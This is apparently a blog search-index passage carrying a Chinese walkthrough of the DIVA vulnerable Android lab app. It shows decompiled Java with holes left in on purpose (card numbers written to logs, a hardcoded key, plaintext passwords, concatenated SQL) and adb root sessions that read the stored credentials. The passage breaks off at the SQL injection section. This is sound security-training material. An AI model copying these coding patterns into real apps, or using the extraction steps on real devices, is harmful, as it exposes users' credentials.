<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DIVA_Android</title>
    <url>/2023/03/25/DIVA-Android/</url>
    <content><![CDATA[<p>参考：</p>
<p><a href="https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn#am">Android 调试桥 (adb)  | Android 开发者  | Android Developers (google.cn)</a></p>
<p><a href="https://blog.csdn.net/cch139745/article/details/53420179">(40条消息) 通过DIVA了解APP安全问题_diva 安全实战_aetkrad的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/Everywhere_wwx/article/details/82256421">(40条消息) Android diva 分析（全)_Flemington、的博客-CSDN博客</a></p>
<p><a href="https://danishzia.medium.com/diva-android-app-walkthrough-bce72b7f273a">DIVA Android App — Walkthrough. Hi, | by Danish Zia | Medium</a></p>
<p><a href="https://www.cnblogs.com/Iamyoyodan/p/14923579.html">DIVA闯关-APP测试 - yoyodan - 博客园 (cnblogs.com)</a></p>
<p><a href="https://support.yeshen.com/zh-CN/qt/ml">Android ADB使用之详细篇 | 夜神模拟器帮助中心 (yeshen.com)</a></p>
<h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><p>Java JDK 1.8、Android SDK Tools、夜神模拟器、Apktool、dex2jar、jd-gui、AXMLPrinter2.jar、jeb（反编译）</p>
<p>使用夜神时可能会出现屏幕显示过大，可以修改渲染设置</p>
<p>之前一直adb devices找不到设备，发现可能原因是 模拟器里面开了代理的原因，关了就成功了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\software\yeshen\Nox\bin&gt;nox_adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62025 device</span><br><span class="line"></span><br><span class="line">E:\software\yeshen\Nox\bin&gt;adb connect 127.0.0.1:62025</span><br><span class="line">already connected to 127.0.0.1:62025</span><br></pre></td></tr></table></figure>

<p>命令记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit：退出shell</span><br><span class="line">adb shell：进入shell</span><br><span class="line">adb logcat：看日志</span><br></pre></td></tr></table></figure>



<h2 id="不安全的日志输出"><a href="#不安全的日志输出" class="headerlink" title="不安全的日志输出"></a>不安全的日志输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell ps| grep -i diva</span><br><span class="line">adb shell logcat | grep 316(或adb logcat)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkout</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">cctxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0096</span>);  <span class="comment">// id:ccText</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.processCC(cctxt.getText().toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(RuntimeException re) &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;diva-log&quot;</span>, <span class="string">&quot;Error while processing transaction with credit card: &quot;</span> + cctxt.getText().toString());</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;An error occured. Please try again later&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040027</span>);  <span class="comment">// layout:activity_log</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCC</span><span class="params">(String ccstr)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="硬编码—第一部分"><a href="#硬编码—第一部分" class="headerlink" title="硬编码—第一部分"></a>硬编码—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HardcodeActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">access</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007B</span>)).getText().toString().equals(<span class="string">&quot;vendorsecretkey&quot;</span>)) &#123;  <span class="comment">// id:hcKey</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access granted! See you on the other side :)&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied! See you in hell :D&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001F</span>);  <span class="comment">// layout:activity_hardcode</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007B</span>)).getText().toString().equals(<span class="string">&quot;vendorsecretkey&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>很明确了，第二个输入字符串：<em><strong>vendorsecretkey</strong></em> 即可</p>
<h2 id="不安全的数据存储—第一部分"><a href="#不安全的数据存储—第一部分" class="headerlink" title="不安全的数据存储—第一部分"></a>不安全的数据存储—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.preference.PreferenceManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage1Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040023</span>);  <span class="comment">// layout:activity_insecure_data_storage1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">sharedPreferences$Editor0</span> <span class="operator">=</span> PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).edit();</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0088</span>);  <span class="comment">// id:ids1Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0089</span>);  <span class="comment">// id:ids1Pwd</span></span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="string">&quot;user&quot;</span>, usr.getText().toString());</span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="string">&quot;password&quot;</span>, pwd.getText().toString());</span><br><span class="line">        sharedPreferences$Editor0.commit();</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用了SharedPreferences类，该类是Android平台上一个轻量级的存储类，主要是用来保存一些常用的配置，本例中是用该类存储了用户名和密码，因此是具有风险的。SharedPreferences类存储的数据会以.xml的形式存储在&#x2F;data&#x2F;data&#x2F;apppackagename&#x2F;shared_prefs目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">不安全的数据存储也是App常见的安全问题之一，主要有三种方式：</span><br><span class="line">1，将敏感数据保存到配置文件中；</span><br><span class="line">2，将敏感数据保存在本地的sqlite3数据库中；</span><br><span class="line">3，将敏感数据保存在临时文件或者sd卡中。</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\software\yeshen\Nox\bin&gt;adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/ # ls</span><br><span class="line">acct</span><br><span class="line">cache</span><br><span class="line">charger</span><br><span class="line">config</span><br><span class="line">d</span><br><span class="line">data</span><br><span class="line">default.prop</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">file_contexts</span><br><span class="line">fstab.shamu</span><br><span class="line">init</span><br><span class="line">init.environ.rc</span><br><span class="line">init.rc</span><br><span class="line">init.shamu.rc</span><br><span class="line">init.trace.rc</span><br><span class="line">init.usb.rc</span><br><span class="line">init.zygote32.rc</span><br><span class="line">lib</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">property_contexts</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">sdcard</span><br><span class="line">seapp_contexts</span><br><span class="line">selinux_version</span><br><span class="line">sepolicy</span><br><span class="line">service_contexts</span><br><span class="line">storage</span><br><span class="line">sys</span><br><span class="line">system</span><br><span class="line">ueventd.rc</span><br><span class="line">ueventd.shamu.rc</span><br><span class="line">vendor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/ # cd data/data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@shamu:/data/data # ls</span><br><span class="line">bin.mt.plus</span><br><span class="line">com.android.Calendar</span><br><span class="line">com.android.backupconfirm</span><br><span class="line">com.android.bluetooth</span><br><span class="line">com.android.browser</span><br><span class="line">com.android.calculator2</span><br><span class="line">com.android.camera2</span><br><span class="line">com.android.captiveportallogin</span><br><span class="line">com.android.certinstaller</span><br><span class="line">com.android.contacts</span><br><span class="line">com.android.defcontainer</span><br><span class="line">com.android.deskclock</span><br><span class="line">com.android.documentsui</span><br><span class="line">com.android.dreams.basic</span><br><span class="line">com.android.externalstorage</span><br><span class="line">com.android.gallery3d</span><br><span class="line">com.android.htmlviewer</span><br><span class="line">com.android.inputdevices</span><br><span class="line">com.android.inputmethod.pinyin</span><br><span class="line">com.android.keychain</span><br><span class="line">com.android.launcher3</span><br><span class="line">com.android.location.fused</span><br><span class="line">com.android.managedprovisioning</span><br><span class="line">com.android.mms.service</span><br><span class="line">com.android.onetimeinitializer</span><br><span class="line">com.android.packageinstaller</span><br><span class="line">com.android.pacprocessor</span><br><span class="line">com.android.phasebeam</span><br><span class="line">com.android.phone</span><br><span class="line">com.android.printspooler</span><br><span class="line">com.android.providers.calendar</span><br><span class="line">com.android.providers.contacts</span><br><span class="line">com.android.providers.downloads</span><br><span class="line">com.android.providers.downloads.ui</span><br><span class="line">com.android.providers.media</span><br><span class="line">com.android.providers.settings</span><br><span class="line">com.android.providers.telephony</span><br><span class="line">com.android.providers.userdictionary</span><br><span class="line">com.android.provision</span><br><span class="line">com.android.proxyhandler</span><br><span class="line">com.android.server.telecom</span><br><span class="line">com.android.settings</span><br><span class="line">com.android.sharedstoragebackup</span><br><span class="line">com.android.shell</span><br><span class="line">com.android.soundrecorder</span><br><span class="line">com.android.systemui</span><br><span class="line">com.android.vpndialogs</span><br><span class="line">com.android.wallpaper.livepicker</span><br><span class="line">com.android.wallpapercropper</span><br><span class="line">com.cyanogenmod.filemanager</span><br><span class="line">com.google.android.webview</span><br><span class="line">com.svox.pico</span><br><span class="line">com.tencent.mm</span><br><span class="line">com.tencent.mobileqq</span><br><span class="line">de.robv.android.xposed.installer</span><br><span class="line">jakhar.aseem.diva</span><br><span class="line">just.trust.me</span><br><span class="line"></span><br><span class="line">cd jakhar.aseem.diva/shared_prefs/     </span><br><span class="line">	</span><br><span class="line">root@shamu:/data/data/jakhar.aseem.diva/shared_prefs # ls</span><br><span class="line">jakhar.aseem.diva_preferences.xml</span><br><span class="line">at jakhar.aseem.diva_preferences.xml                                          &lt;</span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">    &lt;string name=&quot;user&quot;&gt;xcc&lt;/string&gt;</span><br><span class="line">    &lt;string name=&lt;/string&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>得到存的账号密码了。</p>
<h2 id="不安全的数据存储—第二部分"><a href="#不安全的数据存储—第二部分" class="headerlink" title="不安全的数据存储—第二部分"></a>不安全的数据存储—第二部分</h2><p>对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB = <span class="built_in">this</span>.openOrCreateDatabase(<span class="string">&quot;ids2&quot;</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;CREATE TABLE IF NOT EXISTS myuser(user VARCHAR, password VARCHAR);&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;Error occurred while creating database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040024</span>);  <span class="comment">// layout:activity_insecure_data_storage2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008B</span>);  <span class="comment">// id:ids2Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008C</span>);  <span class="comment">// id:ids2Pwd</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO myuser VALUES (\&#x27;&quot;</span> + usr.getText().toString() + <span class="string">&quot;\&#x27;, \&#x27;&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;Error occurred while inserting into database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>账号密码存在sqllite</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127|root@shamu:/data/data/jakhar.aseem.diva/databases # sqlite3 ids2</span><br><span class="line">SQLite version 3.8.6.1 2015-05-21 17:24:32</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line"></span><br><span class="line">sqlite&gt; .table</span><br><span class="line">android_metadata  myuser</span><br><span class="line">sqlite&gt; select * from myuser;</span><br><span class="line">xcc|qwerty</span><br></pre></td></tr></table></figure>

<h2 id="不安全的数据存储—第三部分"><a href="#不安全的数据存储—第三部分" class="headerlink" title="不安全的数据存储—第三部分"></a>不安全的数据存储—第三部分</h2><p>对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040025</span>);  <span class="comment">// layout:activity_insecure_data_storage3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008E</span>);  <span class="comment">// id:ids3Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008F</span>);  <span class="comment">// id:ids3Pwd</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">ddir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getApplicationInfo().dataDir);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file1</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;uinfo&quot;</span>, <span class="string">&quot;tmp&quot;</span>, ddir);</span><br><span class="line">            file1.setReadable(<span class="literal">true</span>);</span><br><span class="line">            file1.setWritable(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file1);</span><br><span class="line">            fw.write(usr.getText().toString() + <span class="string">&quot;:&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;File error occurred&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;File error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>藏在临时文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/data/data/jakhar.aseem.diva # cat uinfo-382362279tmp</span><br><span class="line">xcc:qwerty</span><br></pre></td></tr></table></figure>

<h2 id="不安全的数据存储—第四部分"><a href="#不安全的数据存储—第四部分" class="headerlink" title="不安全的数据存储—第四部分"></a>不安全的数据存储—第四部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage4Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040026</span>);  <span class="comment">// layout:activity_insecure_data_storage4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0092</span>);  <span class="comment">// id:ids4Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0093</span>);  <span class="comment">// id:ids4Pwd</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file0</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">uinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file0.getAbsolutePath() + <span class="string">&quot;/.uinfo.txt&quot;</span>);</span><br><span class="line">            uinfo.setReadable(<span class="literal">true</span>);</span><br><span class="line">            uinfo.setWritable(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(uinfo);</span><br><span class="line">            fw.write(usr.getText().toString() + <span class="string">&quot;:&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;File error occurred&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;File error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存储sd卡的目录一般在： &#x2F;mnt&#x2F;sdcard</p>
<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/mnt/sdcard # ls -la</span><br><span class="line">-rw-rw---- root     sdcard_r       11 2023-03-25 18:15 .uinfo.txt</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Alarms</span><br><span class="line">drwxrwx--x root     sdcard_r          2023-02-06 13:46 Android</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:29 Apps</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 DCIM</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:51 Download</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:50 MT2</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Movies</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Music</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Notifications</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:29 Pictures</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Podcasts</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Ringtones</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-19 22:38 tencent</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 15:58 theme</span><br><span class="line">root@shamu:/mnt/sdcard # cat .uinfo.txt</span><br><span class="line">xcc:qwerty</span><br></pre></td></tr></table></figure>

<h2 id="输入校验问题—第一部分"><a href="#输入校验问题—第一部分" class="headerlink" title="输入校验问题—第一部分"></a>输入校验问题—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLInjectionActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line"> 